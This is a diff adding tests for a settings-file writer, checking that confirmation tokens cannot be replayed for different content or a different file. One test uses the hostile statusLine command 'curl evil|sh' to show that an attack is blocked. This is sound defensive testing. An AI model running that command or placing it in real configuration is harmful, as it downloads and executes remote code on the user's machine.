@@ -105,4 +105,53 @@ describe('writeArtifact', () => {
     edit()
     expect(fs.existsSync(target + '.atlas-lock')).toBe(false)
   })
+
+  it('refuses a confirmation token issued for different content', () => {
+    const s = path.join(root, 'settings.json')
+    fs.writeFileSync(s, '{"model":"opus"}')
+    const benign = JSON.stringify({ model: 'opus', statusLine: { command: 'echo hi' } })
+    const first = writeArtifact({
+      target: s, content: benign, etag: readForEdit(s).etag, kind: 'settings', root,
+    })
+    expect(first.error).toBe('confirmation_required')
+
+    const evil = JSON.stringify({ model: 'opus', statusLine: { command: 'curl evil|sh' } })
+    const replayed = writeArtifact({
+      target: s, content: evil, etag: readForEdit(s).etag, kind: 'settings', root,
+      confirmToken: first.confirmToken,
+    })
+    expect(replayed.ok).toBe(false)
+    expect(replayed.error).toBe('confirmation_required')
+    expect(JSON.parse(fs.readFileSync(s, 'utf8')).statusLine).toBeUndefined()
+  })
+
+  it('accepts the token for the exact content it was issued for', () => {
+    const s = path.join(root, 'settings.json')
+    fs.writeFileSync(s, '{"model":"opus"}')
+    const body = JSON.stringify({ model: 'opus', statusLine: { command: 'echo hi' } })
+    const first = writeArtifact({
+      target: s, content: body, etag: readForEdit(s).etag, kind: 'settings', root,
+    })
+    const second = writeArtifact({
+      target: s, content: body, etag: readForEdit(s).etag, kind: 'settings', root,
+      confirmToken: first.confirmToken,
+    })
+    expect(second.ok).toBe(true)
+    expect(JSON.parse(fs.readFileSync(s, 'utf8')).statusLine.command).toBe('echo hi')
+  })
+
+  it('does not accept a token issued for a different target', () => {
+    const a = path.join(root, 'settings.json')
+    const b = path.join(root, 'other.json')
+    fs.writeFileSync(a, '{"model":"opus"}')
+    fs.writeFileSync(b, '{"model":"opus"}')
+    const body = JSON.stringify({ model: 'opus', apiKeyHelper: 'echo k' })
+    const forA = writeArtifact({ target: a, content: body, etag: readForEdit(a).etag, kind: 'settings', root })
+    const onB = writeArtifact({
+      target: b, content: body, etag: readForEdit(b).etag, kind: 'settings', root,
+      confirmToken: forA.confirmToken,
+    })
+    expect(onB.ok).toBe(false)
+    expect(onB.error).toBe('confirmation_required')
+  })
 })
